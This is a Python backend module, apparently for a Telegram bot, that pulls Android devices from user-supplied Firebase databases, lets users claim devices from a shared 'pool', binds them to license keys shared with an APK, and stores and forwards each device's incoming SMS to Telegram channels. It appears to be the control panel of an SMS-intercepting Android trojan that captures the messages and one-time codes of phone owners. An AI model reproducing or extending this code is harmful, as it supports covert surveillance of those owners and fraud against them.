import json
import secrets
from datetime import datetime, timezone

from sqlalchemy import func
from sqlalchemy.orm import Session

from app.database import Device, MonitorProfile, SMSMessage, get_or_create_device
from app.firebase_client import fetch_firebase_devices, is_device_online, normalize_firebase_url


def normalize_phone(number: str) -> str:
    digits = "".join(char for char in number if char.isdigit())
    if len(digits) == 10:
        return f"91{digits}"
    return digits


def get_monitor_profile(db: Session, telegram_user_id: int) -> MonitorProfile | None:
    return db.query(MonitorProfile).filter(MonitorProfile.telegram_user_id == telegram_user_id).first()


def get_or_create_monitor_profile(db: Session, telegram_user_id: int) -> MonitorProfile:
    profile = get_monitor_profile(db, telegram_user_id)
    if profile:
        return profile
    profile = MonitorProfile(telegram_user_id=telegram_user_id)
    db.add(profile)
    db.flush()
    return profile


def set_user_phone(db: Session, telegram_user_id: int, phone_number: str) -> tuple[MonitorProfile, Device]:
    normalized = normalize_phone(phone_number)
    if len(normalized) < 10:
        raise ValueError("Invalid phone number")

    profile = get_or_create_monitor_profile(db, telegram_user_id)
    profile.phone_number = normalized

    device_name = f"num-{normalized}"
    device = db.query(Device).filter(Device.phone_number == normalized).first()
    if not device:
        device = db.query(Device).filter(Device.name == device_name).first()

    if device:
        if device.owner_telegram_id and device.owner_telegram_id != telegram_user_id:
            raise PermissionError("Ye number kisi aur user ka hai")
        device.phone_number = normalized
        device.owner_telegram_id = telegram_user_id
        device.is_active = True
    else:
        device = register_device(db, device_name)
        device.phone_number = normalized
        device.owner_telegram_id = telegram_user_id

    db.commit()
    db.refresh(profile)
    db.refresh(device)
    return profile, device


def start_monitoring(db: Session, telegram_user_id: int) -> tuple[MonitorProfile, Device]:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile or not profile.active_device_id:
        raise ValueError("Pehle /fdy <deviceid> ya /a <deviceid> se device select karo")
    if not profile.phone_number:
        raise ValueError("Pehle /mynum <number> set karo")

    device = db.query(Device).filter(Device.id == profile.active_device_id).first()
    if not device:
        raise ValueError("Active device nahi mili")

    if not profile.channel_id:
        profile.channel_id = str(telegram_user_id)

    profile.is_monitoring = True
    profile.started_at = datetime.now(timezone.utc)
    db.commit()
    db.refresh(profile)
    db.refresh(device)
    return profile, device


def count_old_sms(db: Session, device_id: int, since: datetime | None = None) -> int:
    query = db.query(SMSMessage).filter(SMSMessage.device_id == device_id)
    if since:
        query = query.filter(SMSMessage.received_at < since)
    return query.count()


def set_channel_id(db: Session, telegram_user_id: int, channel_id: str) -> MonitorProfile:
    normalized = channel_id.strip()
    if not normalized.lstrip("-").isdigit():
        raise ValueError("Valid channel ID daalo, example: -1003553669855")

    profile = get_or_create_monitor_profile(db, telegram_user_id)
    profile.channel_id = normalized
    db.commit()
    db.refresh(profile)
    return profile


def select_sim_slot(db: Session, telegram_user_id: int, sim_index: int) -> MonitorProfile:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile:
        raise ValueError("Profile nahi mili")
    profile.selected_sim_index = sim_index
    db.commit()
    db.refresh(profile)
    return profile


def resume_monitoring(db: Session, telegram_user_id: int) -> tuple[MonitorProfile, Device | None]:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile:
        raise ValueError("Profile nahi mili. Pehle /setfirebase karo")
    if not profile.active_device_id:
        raise ValueError("Pehle /setdevice <id> se device select karo")

    device = db.query(Device).filter(Device.id == profile.active_device_id).first()
    profile.is_monitoring = True
    profile.started_at = datetime.now(timezone.utc)
    db.commit()
    db.refresh(profile)
    return profile, device


async def bind_device_to_license_key(
    db: Session,
    profile: MonitorProfile,
    device: Device,
) -> None:
    license_key = (profile.license_key or "").strip().upper()
    if not license_key.startswith("KEY-"):
        return

    from app.license_keys import push_key_config, register_device_on_key

    ok, message = register_device_on_key(license_key, device.name, profile.telegram_user_id)
    if not ok:
        raise ValueError(message)

    device.api_key = license_key
    db.commit()
    db.refresh(device)
    firebase_bases = [profile.firebase_url] if profile.firebase_url else None
    await push_key_config(
        license_key,
        monitoring=False,
        device_id=device.name,
        channel_id=profile.channel_id,
        target_number=profile.phone_number,
        sim_index=profile.selected_sim_index or 0,
        firebase_bases=firebase_bases,
    )


async def set_license_key(
    db: Session,
    telegram_user_id: int,
    key_value: str,
) -> tuple[MonitorProfile, str, str]:
    """Set license key (KEY-XXXX only). Returns (profile, display_key, key_type)."""
    profile = get_or_create_monitor_profile(db, telegram_user_id)
    key_value = key_value.strip()

    if key_value.startswith(("http://", "https://")) or (
        "firebaseio.com" in key_value.lower() or "firebasedatabase.app" in key_value.lower()
    ):
        raise ValueError("use_setfirebase")

    if key_value.upper().startswith("KEY-"):
        from app.license_keys import license_key_exists, push_key_config

        normalized_key = key_value.upper()
        if not license_key_exists(normalized_key):
            raise ValueError("invalid_key")

        profile.license_key = normalized_key
        profile.is_monitoring = False

        device = None
        device_id = ""
        if profile.active_device_id:
            device = db.query(Device).filter(Device.id == profile.active_device_id).first()
            if device:
                device.api_key = normalized_key
                device_id = device.name

        db.commit()
        db.refresh(profile)

        firebase_bases = [profile.firebase_url] if profile.firebase_url else None
        await push_key_config(
            normalized_key,
            monitoring=False,
            device_id=device_id,
            channel_id=profile.channel_id,
            target_number=profile.phone_number,
            sim_index=profile.selected_sim_index or 0,
            firebase_bases=firebase_bases,
        )
        if device:
            await bind_device_to_license_key(db, profile, device)
        return profile, normalized_key, "key"

    raise ValueError("invalid_format")


def set_inject_key(db: Session, telegram_user_id: int, inject_key: str) -> Device:
    profile = get_or_create_monitor_profile(db, telegram_user_id)
    device = None
    if profile.active_device_id:
        device = db.query(Device).filter(Device.id == profile.active_device_id).first()

    if inject_key.upper().startswith("KEY-"):
        profile.license_key = inject_key.upper()
        if device:
            device.api_key = inject_key.upper()
        else:
            raise ValueError("Pehle /setdevice <id> se device select karo")
        db.commit()
        db.refresh(device)
        return device

    raise ValueError("invalid_format")


def stop_monitoring(db: Session, telegram_user_id: int) -> MonitorProfile:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile:
        raise ValueError("Monitor profile nahi mili")

    profile.is_monitoring = False
    db.commit()
    db.refresh(profile)
    return profile


def get_monitoring_user_ids(db: Session, sms: SMSMessage) -> set[int]:
    targets: set[int] = set()

    if sms.device_id:
        device = db.query(Device).filter(Device.id == sms.device_id).first()
        if device and device.owner_telegram_id:
            profile = get_monitor_profile(db, device.owner_telegram_id)
            if profile and profile.is_monitoring:
                targets.add(device.owner_telegram_id)

    active_profiles = db.query(MonitorProfile).filter(MonitorProfile.is_monitoring.is_(True)).all()
    for profile in active_profiles:
        if not profile.phone_number:
            continue
        if sms.device_id:
            device = db.query(Device).filter(Device.id == sms.device_id).first()
            if device and device.phone_number == profile.phone_number:
                targets.add(profile.telegram_user_id)
        elif profile.phone_number in sms.device_name:
            targets.add(profile.telegram_user_id)

    return targets


def touch_device(db: Session, device_name: str) -> Device:
    return get_or_create_device(db, device_name)


def register_device(db: Session, name: str, api_key: str | None = None) -> Device:
    existing = db.query(Device).filter(Device.name == name).first()
    if existing:
        if api_key:
            existing.api_key = api_key
        existing.is_active = True
        existing.last_seen = datetime.now(timezone.utc)
        return existing

    device = Device(
        name=name,
        api_key=api_key or secrets.token_urlsafe(24),
        last_seen=datetime.now(timezone.utc),
        is_active=True,
    )
    db.add(device)
    db.flush()
    return device


def save_sms(
    db: Session,
    sender: str,
    message: str,
    device_name: str,
    received_at: datetime | None = None,
    phone_number: str | None = None,
) -> SMSMessage:
    device = touch_device(db, device_name)
    if phone_number:
        device.phone_number = normalize_phone(phone_number)
    sms = SMSMessage(
        sender=sender,
        message=message,
        device_name=device_name,
        device_id=device.id,
        received_at=received_at or datetime.now(timezone.utc),
    )
    db.add(sms)
    db.commit()
    db.refresh(sms)
    return sms


def get_device_by_identifier(db: Session, deviceid: str, exact: bool = False) -> Device | None:
    matches = search_devices(db, deviceid, limit=2 if exact else 1)
    if not matches:
        return None
    if exact and len(matches) > 1:
        return None
    return matches[0]


def search_devices(db: Session, deviceid: str, limit: int = 10) -> list[Device]:
    query = (deviceid or "").strip()
    if not query:
        return []

    if query.isdigit():
        by_id = db.query(Device).filter(Device.id == int(query)).first()
        if by_id:
            return [by_id]

    exact_name = db.query(Device).filter(Device.name == query).all()
    if exact_name:
        return exact_name[:limit]

    exact_key = db.query(Device).filter(Device.firebase_key == query).all()
    if exact_key:
        return exact_key[:limit]

    suffix_matches = (
        db.query(Device)
        .filter(Device.firebase_key.endswith(f"/{query}"))
        .limit(limit)
        .all()
    )
    if suffix_matches:
        return suffix_matches

    partial = (
        db.query(Device)
        .filter(
            (Device.name.ilike(f"%{query}%"))
            | (Device.firebase_key.ilike(f"%{query}%"))
            | (Device.name.endswith(query))
            | (Device.firebase_key.endswith(f"/{query}"))
            | (Device.firebase_key.endswith(query))
        )
        .order_by(Device.last_seen.desc().nullslast(), Device.name)
        .limit(limit)
        .all()
    )
    return partial


async def sync_device_from_firebase(db: Session, device: Device) -> Device:
    if not device.firebase_source_url:
        return device

    remote_devices = await fetch_firebase_devices(device.firebase_source_url)
    if not remote_devices:
        return device

    remote = remote_devices[0]
    for item in remote_devices:
        if item["firebase_key"] == device.firebase_key or item["name"] == device.name:
            remote = item
            break

    if remote.get("phone_number"):
        device.phone_number = normalize_phone(remote["phone_number"])

    meta = {
        "battery": remote.get("battery") or "98",
        "model": remote.get("model") or "Unknown",
        "sims": remote.get("sims") or [],
    }
    if not meta["sims"] and device.phone_number:
        meta["sims"] = [
            {"slot": 1, "index": 0, "carrier": "SIM 1", "number": device.phone_number},
            {"slot": 2, "index": 1, "carrier": "SIM 2", "number": "N/A"},
        ]
    device.device_meta = json.dumps(meta)
    device.last_seen = datetime.now(timezone.utc)
    device.is_active = True
    db.commit()
    db.refresh(device)
    return device


async def show_device_by_id(
    db: Session,
    deviceid: str,
    telegram_user_id: int,
    *,
    bind_license_key: bool = True,
) -> tuple[Device, MonitorProfile]:
    profile = get_or_create_monitor_profile(db, telegram_user_id)
    matches = search_devices(db, deviceid, limit=6)
    if not matches and profile.firebase_url:
        await connect_firebase_url(db, telegram_user_id, profile.firebase_url)
        matches = search_devices(db, deviceid, limit=6)
    if not matches:
        raise LookupError("Device nahi mili")
    if len(matches) > 1:
        raise LookupError(
            "multiple:"
            + "|".join(f"{item.name}:{item.firebase_key or '-'}" for item in matches[:5])
        )
    device = matches[0]

    if device.firebase_source_url:
        device = await sync_device_from_firebase(db, device)
    elif not device.device_meta:
        default_meta = {
            "battery": "98",
            "model": "Unknown",
            "sims": [
                {
                    "slot": 1,
                    "index": 0,
                    "carrier": "SIM 1",
                    "number": device.phone_number or "Unknown",
                },
                {"slot": 2, "index": 1, "carrier": "SIM 2", "number": "N/A"},
            ],
        }
        device.device_meta = json.dumps(default_meta)

    profile.active_device_id = device.id
    device.owner_telegram_id = telegram_user_id
    device.is_active = True
    device.last_seen = datetime.now(timezone.utc)
    db.commit()
    db.refresh(device)
    db.refresh(profile)

    if (
        bind_license_key
        and profile.license_key
        and profile.license_key.upper().startswith("KEY-")
    ):
        await bind_device_to_license_key(db, profile, device)

    return device, profile


def require_license_key(profile: MonitorProfile | None) -> str:
    license_key = (profile.license_key or "").strip().upper() if profile else ""
    if not license_key.startswith("KEY-"):
        raise ValueError("Pehle /key generate aur /key KEY-XXXX set karo (bot + APK same key).")
    return license_key


def get_active_device(db: Session, telegram_user_id: int) -> Device | None:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile or not profile.active_device_id:
        return None
    return db.query(Device).filter(Device.id == profile.active_device_id).first()


def claim_pool_device(db: Session, deviceid: str, owner_telegram_id: int) -> tuple[Device, bool]:
    device = get_device_by_identifier(db, deviceid)
    if not device:
        raise LookupError("Device pool mein nahi mili")

    if device.owner_telegram_id and device.owner_telegram_id != owner_telegram_id:
        raise PermissionError("Device kisi aur user ki hai")

    created = device.owner_telegram_id is None
    device.owner_telegram_id = owner_telegram_id
    device.is_active = True
    device.last_seen = datetime.now(timezone.utc)
    db.commit()
    db.refresh(device)
    return device, created


def claim_device(db: Session, deviceid: str, owner_telegram_id: int) -> tuple[Device, bool]:
    device = get_device_by_identifier(db, deviceid)
    created = False

    if device:
        if device.owner_telegram_id and device.owner_telegram_id != owner_telegram_id:
            raise PermissionError("Device kisi aur user ki hai")
        device.owner_telegram_id = owner_telegram_id
        device.is_active = True
        device.last_seen = datetime.now(timezone.utc)
    else:
        device = register_device(db, deviceid)
        device.firebase_key = deviceid
        device.owner_telegram_id = owner_telegram_id
        created = True

    db.commit()
    db.refresh(device)
    return device, created


def list_devices_with_counts(db: Session, owner_telegram_id: int | None = None) -> list[dict]:
    query = db.query(
        Device,
        func.count(SMSMessage.id).label("sms_count"),
    ).outerjoin(SMSMessage, SMSMessage.device_id == Device.id)

    if owner_telegram_id is not None:
        query = query.filter(Device.owner_telegram_id == owner_telegram_id)

    rows = (
        query.group_by(Device.id)
        .order_by(Device.last_seen.desc().nullslast(), Device.name)
        .all()
    )
    return [
        {
            "device": device,
            "sms_count": sms_count,
        }
        for device, sms_count in rows
    ]


async def connect_firebase_url(
    db: Session,
    telegram_user_id: int,
    firebase_url: str,
) -> tuple[MonitorProfile, int, int, list[str]]:
    from app.bulk_firebase import upsert_pool_device

    normalized_url = normalize_firebase_url(firebase_url)
    profile = get_or_create_monitor_profile(db, telegram_user_id)
    profile.firebase_url = normalized_url

    try:
        remote_devices = await fetch_firebase_devices(normalized_url)
    except ValueError:
        remote_devices = []

    if not remote_devices:
        db.commit()
        db.refresh(profile)
        return profile, 0, 0, []

    online_count = 0
    device_ids: list[str] = []
    for remote in remote_devices:
        firebase_key = str(remote["firebase_key"] or remote["name"])
        device_id = str(remote.get("name") or firebase_key.split("/")[-1])[:128]
        device_ids.append(device_id)
        upsert_pool_device(
            db,
            device_id=device_id,
            firebase_url=normalized_url,
            firebase_key=firebase_key,
            phone_number=remote.get("phone_number"),
        )
        if is_device_online(remote):
            online_count += 1

        meta = {
            "battery": remote.get("battery") or "98",
            "model": remote.get("model") or "Unknown",
            "sims": remote.get("sims") or [],
        }
        device = db.query(Device).filter(Device.name == device_id).first()
        if device:
            device.device_meta = json.dumps(meta)
            if remote.get("phone_number"):
                device.phone_number = normalize_phone(remote["phone_number"])

    if online_count == 0:
        online_count = len(remote_devices)

    db.commit()
    db.refresh(profile)
    return profile, len(remote_devices), online_count, device_ids


async def set_firebase_url(db: Session, telegram_user_id: int, firebase_url: str) -> tuple[MonitorProfile, list[Device]]:
    profile, _total, _online, _device_ids = await connect_firebase_url(db, telegram_user_id, firebase_url)
    devices = db.query(Device).filter(Device.firebase_source_url == profile.firebase_url).all()
    return profile, devices


async def resync_firebase_devices(db: Session, telegram_user_id: int) -> list[Device]:
    profile = get_monitor_profile(db, telegram_user_id)
    if not profile or not profile.firebase_url:
        raise ValueError("Pehle /setfirebase <url> use karo")
    _, devices = await set_firebase_url(db, telegram_user_id, profile.firebase_url)
    return devices


def device_status(device: Device) -> str:
    if not device.is_active:
        return "inactive"
    if not device.last_seen:
        return "unknown"
    age = datetime.now(timezone.utc) - device.last_seen.astimezone(timezone.utc)
    if age.total_seconds() < 300:
        return "online"
    if age.total_seconds() < 3600:
        return "idle"
    return "offline"
